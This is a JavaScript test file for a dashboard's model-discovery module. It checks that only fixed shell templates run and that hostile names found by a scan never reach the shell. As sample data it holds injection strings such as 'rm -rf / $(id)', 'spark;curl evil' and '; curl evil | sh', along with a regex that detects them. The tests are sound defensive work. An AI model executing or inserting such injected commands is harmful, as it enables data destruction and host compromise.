/**
 * Why this file exists: "Discover on this Spark" runs shell commands on the
 * dashboard's own host. The scan output becomes dialog text and, later, the
 * start/stop scripts of a launcher, so two properties must hold even when the
 * host is hostile: (1) every command is one of the module's FIXED templates —
 * nothing a scan found (a model named `; curl evil | sh`) can ever be spliced
 * back into a shell string, and (2) a source that fails degrades to a note
 * instead of throwing or silently pretending nothing exists. The tests drive
 * the module with a recording execHost stub, so they run anywhere.
 */
import assert from "node:assert/strict";
import test from "node:test";
import {
  buildFindStartsCommand,
  buildFindStopsCommand,
  buildHfCacheCommand,
  buildOllamaListCommand,
  buildOllamaRunningCommand,
  discoverModelCandidates,
  hfNameFromDirEntry,
  isSafeScanRoot,
  mapScriptedFindOutput,
  parseHfCacheListing,
  parseOllamaList,
} from "../discovery.js";

const ROOTS = ["$HOME", "$HOME/llms", "$HOME/models", "$HOME/Qwen*"];

const OLLAMA_TABLE = [
  "NAME                     SIZE      MODIFIED",
  "glm-5.3:latest           45 GB     3 days ago",
  "llama3.2:3b              2.0 GB    2 weeks ago",
  "",
  "garbage row without size",
].join("\n");

const HF_LISTING = ["models--google--gemma-3-27b-it", "models--NousResearch--Hermes-4", "version.txt", "datasets--x--y", "models--broken"].join("\n");

/** execHost stub that answers each fixed template by its discriminator and records every command. */
function stubExecHost({ starts, stops, ollamaRunning = "a1b2c3d4e5f6", ollamaList = "", hf = "" } = {}) {
  const commands = [];
  const execHost = async (cmd, timeoutMs) => {
    assert.ok(typeof timeoutMs === "number" && timeoutMs > 0, "every command must carry a timeout");
    commands.push(cmd);
    if (cmd.startsWith("find ") && cmd.includes("-name start.sh")) return starts ?? "";
    if (cmd.startsWith("find ") && cmd.includes("-name stop.sh")) return stops ?? "";
    if (cmd === buildOllamaRunningCommand()) return ollamaRunning;
    if (cmd === buildOllamaListCommand()) return ollamaList;
    if (cmd === buildHfCacheCommand()) return hf;
    throw new Error(`unexpected command: ${cmd}`);
  };
  execHost.commands = commands;
  return execHost;
}

test("scripted: find output maps to launchable candidates", () => {
  const out = [
    "/home/spark/llms/glm-5.3/start.sh",
    "/home/spark/Qwen3-32B/start.sh",
    "/home/spark/llms/glm-5.3/start.sh", // duplicate via nested roots
    "/home/spark/.cache/junk/start.sh", // dot-dir → skipped
    "/home/spark/app/node_modules/pkg/start.sh", // node_modules → skipped
    "/home/spark/noise.txt", // not a start.sh → skipped
  ].join("\n");
  const stops = "/home/spark/llms/glm-5.3/stop.sh\n";
  const found = mapScriptedFindOutput(out, stops);
  assert.deepEqual(found, [
    {
      kind: "scripted",
      name: "glm-5.3",
      directory: "/home/spark/llms/glm-5.3",
      startScript: "start.sh",
      stopScript: "stop.sh",
    },
    {
      kind: "scripted",
      name: "Qwen3-32B",
      directory: "/home/spark/Qwen3-32B",
      startScript: "start.sh",
      stopScript: null,
    },
  ]);
});

test("ollama: NAME/SIZE columns parse; header and junk rows drop", () => {
  assert.deepEqual(parseOllamaList(OLLAMA_TABLE), [
    { kind: "ollama", name: "glm-5.3:latest", size: "45 GB" },
    { kind: "ollama", name: "llama3.2:3b", size: "2.0 GB" },
  ]);
  assert.deepEqual(parseOllamaList(""), []);
});

test("huggingface: models--org--name converts to org/name; non-model entries drop", () => {
  assert.equal(hfNameFromDirEntry("models--google--gemma-3-27b-it"), "google/gemma-3-27b-it");
  assert.equal(hfNameFromDirEntry("models--NousResearch--Hermes-4"), "NousResearch/Hermes-4");
  assert.equal(hfNameFromDirEntry("models--broken"), null);
  assert.equal(hfNameFromDirEntry("version.txt"), null);
  assert.equal(hfNameFromDirEntry("datasets--x--y"), null);
  const mapped = parseHfCacheListing(HF_LISTING);
  assert.deepEqual(mapped, [
    { kind: "huggingface", name: "google/gemma-3-27b-it", directory: "~/.cache/huggingface/hub/models--google--gemma-3-27b-it" },
    { kind: "huggingface", name: "NousResearch/Hermes-4", directory: "~/.cache/huggingface/hub/models--NousResearch--Hermes-4" },
  ]);
});

test("discover: all three sources land in one candidate list", async () => {
  const execHost = stubExecHost({
    starts: "/home/spark/llms/glm-5.3/start.sh\n",
    stops: "",
    ollamaList: OLLAMA_TABLE,
    hf: HF_LISTING,
  });
  const result = await discoverModelCandidates({ execHost, sshUser: "spark", roots: ROOTS });
  assert.deepEqual(result.notes, []);
  assert.deepEqual(result.scannedRoots, ROOTS);
  assert.equal(result.candidates.filter((c) => c.kind === "scripted").length, 1);
  assert.equal(result.candidates.filter((c) => c.kind === "ollama").length, 2);
  assert.equal(result.candidates.filter((c) => c.kind === "huggingface").length, 2);
});

test("discover: ollama omitted silently when the engine container is not running", async () => {
  // `docker ps -q` prints nothing (no container id) when the engine is stopped.
  const execHost = stubExecHost({ starts: "", ollamaRunning: "", ollamaList: OLLAMA_TABLE, hf: "" });
  const result = await discoverModelCandidates({ execHost, sshUser: "spark", roots: ROOTS });
  assert.deepEqual(result.candidates, []);
  assert.deepEqual(result.notes, [], "a stopped engine is the normal desktop state, not a note");
  assert.equal(execHost.commands.includes(buildOllamaListCommand()), false, "must not exec into a stopped container");
});

test("discover: a failing source degrades to a note, never throws", async () => {
  const execHost = stubExecHost({ starts: "/home/spark/llms/glm-5.3/start.sh\n" });
  const real = execHost.bind(null);
  const failing = async (cmd, timeoutMs) => {
    if (cmd === buildHfCacheCommand()) throw new Error("ls: permission denied");
    return real(cmd, timeoutMs);
  };
  failing.commands = execHost.commands;
  const result = await discoverModelCandidates({ execHost: failing, sshUser: "spark", roots: ROOTS });
  assert.equal(result.candidates.length, 1, "the healthy sources still answer");
  assert.equal(result.candidates[0].kind, "scripted");
  assert.equal(result.notes.length, 1);
  assert.match(result.notes[0], /^huggingface: ls: permission denied$/);
});

test("hardening: the templates are exactly the fixed commands from the spec", () => {
  // Pin the literal strings: any future edit must be a deliberate review, not a drift.
  assert.equal(
    buildFindStartsCommand(ROOTS),
    `find ${ROOTS.join(" ")} -maxdepth 3 -type f -name start.sh 2>/dev/null | head -30`
  );
  assert.equal(
    buildFindStopsCommand(ROOTS),
    `find ${ROOTS.join(" ")} -maxdepth 3 -type f -name stop.sh 2>/dev/null | head -30`
  );
  assert.equal(buildOllamaRunningCommand(), "docker ps -q -f name=^spark-ollama-engine$ 2>/dev/null | head -1");
  assert.equal(buildOllamaListCommand(), "docker exec spark-ollama-engine ollama list 2>/dev/null");
  assert.equal(buildHfCacheCommand(), "ls -1 $HOME/.cache/huggingface/hub 2>/dev/null | head -30");
});

test("hardening: execHost only ever sees the fixed command templates", async () => {
  // Hostile names and paths flow BACK from the host: they must never re-enter
  // a command. sshUser is config, not scan output, but is refused if malformed.
  const hostile = 'rm -rf / $(id) `touch pwned` ; rm -rf /';
  const execHost = stubExecHost({
    starts: `/home/spark/${hostile}/start.sh\n`,
    stops: `/home/spark/${hostile}/stop.sh\n`,
    ollamaList: "evil-$(id)-`touch`-;rm:latest        1 GB     now",
    hf: "models--evil--rm_-rf_$(id)_`touch`",
  });
  const result = await discoverModelCandidates({ execHost, sshUser: "spark", roots: ROOTS });
  const fixed = new Set([
    buildFindStartsCommand(ROOTS),
    buildFindStopsCommand(ROOTS),
    buildOllamaRunningCommand(),
    buildOllamaListCommand(),
    buildHfCacheCommand(),
  ]);
  assert.ok(execHost.commands.length > 0);
  for (const cmd of execHost.commands) {
    assert.ok(fixed.has(cmd), `command is not a fixed template: ${cmd}`);
    assert.doesNotMatch(cmd, /rm -rf|touch|curl|\(id\)/, "user-influenced text reached the shell");
  }
  // The hostile values still round-trip as DATA, proving the scan consumed them.
  assert.ok(result.candidates.some((c) => c.kind === "scripted" && c.name.includes("rm -rf")));
  assert.ok(result.candidates.some((c) => c.kind === "ollama" && c.name.includes("$(")));
  assert.ok(result.candidates.some((c) => c.kind === "huggingface" && c.name.includes("`")));
});

test("hardening: a user-supplied string can never reach a command", async () => {
  const execHost = stubExecHost({ starts: "" });
  await discoverModelCandidates({ execHost, sshUser: "unitoperator", roots: ROOTS });
  const joined = execHost.commands.join("\n");
  for (const probe of ["unitoperator", "evil", "candidate", "pwned"]) {
    assert.ok(!joined.includes(probe), `command contains free text: ${probe}`);
  }
  // An ssh user that is not a plain username is refused before anything runs.
  await assert.rejects(
    () => discoverModelCandidates({ execHost, sshUser: "spark;curl evil", roots: ROOTS }),
    /Invalid SSH user/
  );
});

test("hardening: unsafe scan roots are refused and never reach find", async () => {
  const execHost = stubExecHost({ starts: "" });
  const roots = ["/ok/models", "/bad;rm -rf /", "has space", "$(id)", ""];
  const result = await discoverModelCandidates({ execHost, sshUser: "spark", roots });
  assert.deepEqual(result.scannedRoots, ["/ok/models"]);
  assert.equal(execHost.commands.filter((c) => c.startsWith("find ")).length, 2);
  for (const cmd of execHost.commands.filter((c) => c.startsWith("find "))) {
    assert.ok(cmd.includes("/ok/models"));
    assert.ok(!cmd.includes(";") && !cmd.includes("$("), `unsafe root leaked into find: ${cmd}`);
  }
  assert.equal(result.notes.length, 4, "each rejected root is explained in a note");
  assert.equal(isSafeScanRoot("/home/spark/models"), true);
  assert.equal(isSafeScanRoot("$HOME/Qwen*"), true);
  assert.equal(isSafeScanRoot("/tmp/../etc"), false);
});
